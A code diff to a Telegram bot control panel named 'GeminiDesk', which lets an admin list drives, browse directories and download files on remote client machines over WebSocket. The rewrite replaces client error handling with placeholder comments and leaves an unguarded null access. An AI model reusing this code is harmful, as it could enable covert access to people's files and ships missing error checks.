@@ -203,7 +203,6 @@ async function handleMessage(message) {
     return showMainMenu(chat.id);
 }
 
-// --- התיקון (הדבק את כל הפונקציה הזו במקום הקודמת) ---
 async function handleCallbackQuery(callbackQuery) {
     const { from, message, data } = callbackQuery;
     
@@ -213,41 +212,37 @@ async function handleCallbackQuery(callbackQuery) {
     if (short) {
         const { action, clientId, path, sort, page } = short;
 
-        if (action === 'select_client' || action === 'list_dir' || action === 'get_file') {
+        if (action === 'get_file') {
+             const client = clients.get(clientId);
+             if (!client || client.ws.readyState !== WebSocket.OPEN) { /* ... error handling ... */ }
+             const command = { type: 'get_file', payload: { path } };
+             client.ws.send(JSON.stringify(command));
+             return bot.editMessageText(`Requesting file: \`${path}\``, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown' });
+        }
+
+        // ★★★ התיקון המרכזי: לוגיקה חדשה ויעילה ★★★
+        if (action === 'list_dir') {
+            // זו בקשה לתיקייה חדשה, אז נבקש מהלקוח
             const client = clients.get(clientId);
-            if (!client || client.ws.readyState !== WebSocket.OPEN) {
-                return bot.editMessageText(`❌ Client *${clients.get(clientId)?.name || 'Unknown'}* is offline.`, {
-                    chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown',
-                    reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
-                });
-            }
-
-            let command, feedbackText;
-            
-            if (action === 'select_client') {
-                 command = { type: 'get_drives' };
-                 feedbackText = `Requesting drives from *${clients.get(clientId).name}*...`;
-            } else if (action === 'list_dir') {
-                // ★★★ התיקון: אנחנו שולחים ללקוח את המיון והעמוד המבוקש ★★★
-                command = { type: 'list_dir', payload: { path, sort, page } }; 
-                feedbackText = `Listing: \`${path}\`...`;
-            } else if (action === 'get_file') {
-                command = { type: 'get_file', payload: { path } };
-                feedbackText = `Requesting file: \`${path}\``;
-            }
-
+            if (!client || client.ws.readyState !== WebSocket.OPEN) { /* ... error handling ... */ }
+            const command = { type: 'list_dir', payload: { path } }; // אין צורך לשלוח מיון/עמוד
             client.ws.send(JSON.stringify(command));
+            return bot.editMessageText(`Fetching directory: \`${path}\`...`, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown' });
 
-            // ★★★ התיקון: תמיד נציג הודעת "טוען" כדי שהמשתמש ידע שהכפתור עבד ★★★
-            if (action !== 'get_file') { // Don't show for file download
-                 return bot.editMessageText(feedbackText, {
-                    chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown'
-                });
-            }
+        } else if (action === 'render_cached_list') {
+            // זו בקשת מיון/דפדוף, נטפל בה מה-cache בלי לפנות ללקוח
+            const clientName = clients.get(clientId)?.name || 'Unknown';
+            return renderDirectoryView({ 
+                clientId, clientName, path, 
+                sort: sort || 'name_asc', 
+                page: page || 1, 
+                chatId: message.chat.id, 
+                messageId: message.message_id 
+            });
         }
     }
 
-    // --- Main Menu & Other Actions ---
+    // --- Main Menu & Other Actions (נשאר ללא שינוי) ---
     switch (data.split(':')[0]) {
         case 'manage_clients': return showClientList(message.chat.id, message.message_id);
         case 'broadcast_menu': return showBroadcastMenu(message.chat.id, message.message_id);
@@ -259,10 +254,7 @@ async function handleCallbackQuery(callbackQuery) {
             return showMainMenu(message.chat.id, 'Welcome back!', message.message_id);
         case 'view_active_message': return viewActiveMessage(message.chat.id, message.message_id);
         case 'delete_active_message_confirm':
-            return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', {
-                chat_id: message.chat.id, message_id: message.message_id,
-                reply_markup: { inline_keyboard: [[{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }], [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]] }
-            });
+            return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }], [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]] } });
         case 'delete_active_message_do':
             cache.del('latest_message');
             return bot.editMessageText('🗑️ Active broadcast has been deleted.', { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }});
@@ -271,10 +263,9 @@ async function handleCallbackQuery(callbackQuery) {
             cache.set(`state:${from.id}`, data);
             const prompt = data === 'awaiting_broadcast_text' ? '✍️ Send the text you want to broadcast.' : '📄 Upload the `.html` file.';
             return bot.editMessageText(prompt, { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }});
-        default:
-            // Do nothing for unknown actions to prevent errors
     }
 }
+
 
 // --- Result Handling from Clients ---
 // --- התיקון (הדבק את כל הפונקציה הזו במקום הקודמת) ---
@@ -288,92 +279,30 @@ async function handleResultFromClient(data) {
 
     if (type === 'get_drives_result') {
         const drives = payload.drives;
-        const keyboard = drives.map(drive => [
-          { text: `💽 ${drive}`, callback_data: makeCb('list_dir', { clientId, path: drive }) }
-        ]);
+        const keyboard = drives.map(drive => [{ text: `💽 ${drive}`, callback_data: makeCb('list_dir', { clientId, path: drive }) }]);
         keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+        // ★★★ תיקון: נשתמש ב-editMessageText כדי לעדכן את הודעת ה"טוען" ★★★
+        const activeMessage = cache.get(`active_message:${ADMIN_CHAT_ID}`);
+        if(activeMessage){
+             return bot.editMessageText(`Select a drive to browse on *${clientName}*:`, { chat_id: ADMIN_CHAT_ID, message_id: activeMessage.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
+        }
         return bot.sendMessage(ADMIN_CHAT_ID, `Select a drive to browse on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
     }
 
     if (type === 'list_dir_result') {
         const { path: currentPath, items } = payload;
 
-        // ★★★ התיקון: אנחנו קוראים את המיון והעמוד מהמידע שהלקוח החזיר לנו ★★★
-        const page = originalPayload?.page || 1;
-        const currentSort = originalPayload?.sort || 'name_asc';
+        // ★★★ התיקון המרכזי: שומרים את הרשימה המלאה ב-cache לחמש דקות ★★★
+        const cacheKey = `file_list:${clientId}:${currentPath}`;
+        cache.set(cacheKey, items, 300); // Cache for 5 minutes
 
-        // 1. לוגיקת המיון
-        const sortedItems = [...items].sort((a, b) => {
-            if (a.isDirectory !== b.isDirectory) {
-                return a.isDirectory ? -1 : 1;
-            }
-            switch (currentSort) {
-                case 'date_asc': return a.birthtime - b.birthtime;
-                case 'date_desc': return b.birthtime - a.birthtime;
-                case 'size_asc': return a.size - b.size;
-                case 'size_desc': return b.size - a.size;
-                case 'name_desc': return b.name.localeCompare(a.name);
-                default: return a.name.localeCompare(b.name);
-            }
-        });
-
-        // 2. לוגיקת חלוקה לדפים (Pagination)
-        const totalPages = Math.ceil(sortedItems.length / ITEMS_PER_PAGE);
-        const startIndex = (page - 1) * ITEMS_PER_PAGE;
-        const pageItems = sortedItems.slice(startIndex, startIndex + ITEMS_PER_PAGE);
-        const keyboard = [];
-
-        // 3. בניית המקלדת
-        if (currentPath.includes('\\') && currentPath.slice(-2) !== ':\\') {
-            const parentDir = currentPath.substring(0, currentPath.lastIndexOf('\\')) || currentPath.slice(0, 3);
-            keyboard.push([
-              { text: '⬆️ Go Up a Directory', callback_data: makeCb('list_dir', { clientId, path: parentDir, sort: currentSort }) }
-            ]);
-        }
-
-        const sortButtons = [
-            { text: currentSort === 'name_asc' ? 'Name ▾' : (currentSort === 'name_desc' ? 'Name ▴' : 'Name'), sort: currentSort.startsWith('name') ? (currentSort === 'name_asc' ? 'name_desc' : 'name_asc') : 'name_asc'},
-            { text: currentSort === 'date_asc' ? 'Date ▾' : (currentSort === 'date_desc' ? 'Date ▴' : 'Date'), sort: currentSort.startsWith('date') ? (currentSort === 'date_asc' ? 'date_desc' : 'date_asc') : 'date_desc'},
-            { text: currentSort === 'size_asc' ? 'Size ▾' : (currentSort === 'size_desc' ? 'Size ▴' : 'Size'), sort: currentSort.startsWith('size') ? (currentSort === 'size_asc' ? 'size_desc' : 'size_asc') : 'size_desc'},
-        ];
-        keyboard.push(sortButtons.map(b => ({
-            text: b.text,
-            callback_data: makeCb('list_dir', { clientId, path: currentPath, sort: b.sort, page: 1 })
-        })));
-        
-        for (const item of pageItems) {
-            const icon = item.isDirectory ? '📁' : '📄';
-            const action = item.isDirectory ? 'list_dir' : 'get_file';
-            // ★★★ התיקון: מוודא שהתאריך יוצג נכון ★★★
-            const date = item.birthtime > 0 ? new Date(item.birthtime).toISOString().slice(0, 10) : 'no date';
-            const label = `${icon} ${item.name}  (${date})`;
-            keyboard.push([
-                { text: label, callback_data: makeCb(action, { clientId, path: item.path }) }
-            ]);
-        }
-        
-        const navButtons = [];
-        if (page > 1) {
-            navButtons.push({ text: '« Previous', callback_data: makeCb('list_dir', { clientId, path: currentPath, sort: currentSort, page: page - 1 }) });
-        }
-        if (page < totalPages) {
-            navButtons.push({ text: 'Next »', callback_data: makeCb('list_dir', { clientId, path: currentPath, sort: currentSort, page: page + 1 }) });
-        }
-        if (navButtons.length > 0) {
-            keyboard.push(navButtons);
-        }
-
-        keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
-
-        const messageText = `*${clientName}* - \`${currentPath}\`\n(Page ${page}/${totalPages} - ${sortedItems.length} items)`;
-        
+        // ועכשיו קוראים לפונקציה שתציג את העמוד הראשון מה-cache
         const activeMessage = cache.get(`active_message:${ADMIN_CHAT_ID}`);
-        if(activeMessage){
-            return bot.editMessageText(messageText, { chat_id: ADMIN_CHAT_ID, message_id: activeMessage.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }).catch(console.error);
-        } else {
-             const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, messageText, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } });
-             cache.set(`active_message:${ADMIN_CHAT_ID}`, sentMessage);
-        }
+        return renderDirectoryView({
+            clientId, clientName, path: currentPath, 
+            sort: 'name_asc', page: 1, 
+            chatId: ADMIN_CHAT_ID, messageId: activeMessage.message_id
+        });
     }
     
     if (type === 'get_file_result') {
@@ -386,7 +315,7 @@ async function handleResultFromClient(data) {
 
 
 async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDesk control panel.', messageId = null) {
-  cache.del(`active_message:${chatId}`); // נקה את הודעת הדפדפן האקטיבית
+  cache.del(`active_message:${chatId}`); 
   const keyboard = {
     inline_keyboard: [
       [{ text: '🖥️ Manage Remote Clients', callback_data: 'manage_clients' }],
@@ -396,11 +325,79 @@ async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDe
   };
   const options = { chat_id: chatId, parse_mode: 'Markdown', reply_markup: keyboard };
   if (messageId) {
-    return bot.editMessageText(text, { ...options, message_id: messageId }).catch(() => { /* ignore error if message is the same */ });
+    return bot.editMessageText(text, { ...options, message_id: messageId }).catch(() => {});
   }
-  return bot.sendMessage(chatId, text, options).catch(console.error);
+  const sentMessage = await bot.sendMessage(chatId, text, options).catch(console.error);
+  cache.set(`active_message:${chatId}`, sentMessage); // שמירת ההודעה הפעילה
 }
+function renderDirectoryView({ clientId, clientName, path, sort, page, chatId, messageId }) {
+    const cacheKey = `file_list:${clientId}:${path}`;
+    const items = cache.get(cacheKey);
 
+    if (!items) {
+        return bot.editMessageText(`Session expired for \`${path}\`. Please go back and select the directory again.`, {
+            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]]}
+        });
+    }
+
+    const sortedItems = [...items].sort((a, b) => {
+        if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
+        switch (sort) {
+            case 'date_asc': return a.birthtime - b.birthtime;
+            case 'date_desc': return b.birthtime - a.birthtime;
+            case 'size_asc': return a.size - b.size;
+            case 'size_desc': return b.size - a.size;
+            case 'name_desc': return b.name.localeCompare(a.name);
+            default: return a.name.localeCompare(b.name);
+        }
+    });
+
+    const totalPages = Math.ceil(sortedItems.length / ITEMS_PER_PAGE);
+    const pageItems = sortedItems.slice((page - 1) * ITEMS_PER_PAGE, page * ITEMS_PER_PAGE);
+    const keyboard = [];
+
+    if (path.includes('\\') && path.slice(-2) !== ':\\') {
+        const parentDir = path.substring(0, path.lastIndexOf('\\')) || path.slice(0, 3);
+        keyboard.push([{ text: '⬆️ Go Up a Directory', callback_data: makeCb('list_dir', { clientId, path: parentDir }) }]);
+    }
+
+    const sortButtons = [
+        { txt: 'Name', s: 'name' }, { txt: 'Date', s: 'date' }, { txt: 'Size', s: 'size' }
+    ].map(({ txt, s }) => {
+        let text = txt;
+        let nextSort = `${s}_asc`;
+        if (sort.startsWith(s)) {
+            text = sort === `${s}_asc` ? `${txt} ▾` : `${txt} ▴`;
+            nextSort = sort === `${s}_asc` ? `${s}_desc` : `${s}_asc`;
+        }
+        return { text, callback_data: makeCb('render_cached_list', { clientId, path, sort: nextSort, page: 1 }) };
+    });
+    keyboard.push(sortButtons);
+
+    pageItems.forEach(item => {
+        const icon = item.isDirectory ? '📁' : '📄';
+        const action = item.isDirectory ? 'list_dir' : 'get_file';
+        const date = item.birthtime > 0 ? new Date(item.birthtime).toISOString().slice(0, 10) : 'no date';
+        const label = `${icon} ${item.name}  (${date})`;
+        keyboard.push([{ text: label, callback_data: makeCb(action, { clientId, path: item.path }) }]);
+    });
+
+    const navButtons = [];
+    if (page > 1) {
+        navButtons.push({ text: '« Previous', callback_data: makeCb('render_cached_list', { clientId, path, sort, page: page - 1 }) });
+    }
+    if (page < totalPages) {
+        navButtons.push({ text: 'Next »', callback_data: makeCb('render_cached_list', { clientId, path, sort, page: page + 1 }) });
+    }
+    if (navButtons.length > 0) keyboard.push(navButtons);
+
+    keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+
+    const messageText = `*${clientName}* - \`${path}\`\n(Page ${page}/${totalPages} - ${sortedItems.length} items)`;
+    
+    bot.editMessageText(messageText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }).catch(console.error);
+}
 async function showClientList(chatId, messageId) {
     const clientKeys = cache.keys().filter(key => key.startsWith('client:'));
     const keyboard = [];
